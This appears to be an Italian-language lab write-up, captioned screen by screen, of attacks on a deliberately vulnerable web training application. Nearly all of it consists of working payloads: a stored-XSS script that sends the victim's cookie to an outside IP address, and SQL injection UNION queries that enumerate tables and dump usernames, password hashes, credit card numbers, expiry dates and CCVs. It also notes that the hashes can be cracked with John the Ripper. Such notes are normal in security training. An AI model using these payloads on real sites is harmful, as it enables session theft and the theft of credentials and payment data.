# Screen_1:
utilizzando questo script <script>window.location="http://192.168.50.100:12345/?cookie"+document.cookie</script> nell XSS stored possiamo ottenere il cookie dell utente
# Screen_2:
per utilizzare lo script bisogna prima modificare la lunghezza massima dei caratteri
# Screen_3:
utilizzando questa query %' and 1=0 union select null, table_name from information_schema.tables # in SQL Injection possiamo vedere tutte le tabelle presenti
# Screen_4:
utilizzando questa query %' and 1=0 union select table_name, column_name from information_schema.columns where table_name = 'users' # possiamo vedere tutte le colonne presenti nella tabella users
# Screen_5:
utilizzando questa query 1' union select user, password from users# possiamo vedere tutti gli username e password degli utenti solo che lo password sono sottoforma di hash
# Screen_6:
utilizzando john the ripper possiamo decifrare le password facilmente
# Screen_7:
ricollegandoci allo screen_3 possiamo notare che esiste una tabella chiamata credit_cards e utilizzando questa query %' union select ccnumber, expiration from owasp10.credit_cards# possiamo vedere tutti gli ccnumber e le date di scadenza delle carte
# Screen_8:
invece utilizzando questa query %' union select ccnumber, ccv from owasp10.credit_cards# possiamo vedere anche il CCV cosi da avere tutti i dati per le carte di credito
# Screen_9:
utilizzando questo script 1<script>alert(document.cookie)</script> in SQL Injection (blind) ci apre un pop up con il cookie cio significa che ce anche una vulnerabilità di tipo XSS
# Screen_10
utilizzando questa query 1 OR 1 = 1 UNION SELECT user, password FROM users si riesce a vedere gli username e password anche con il livello a medium
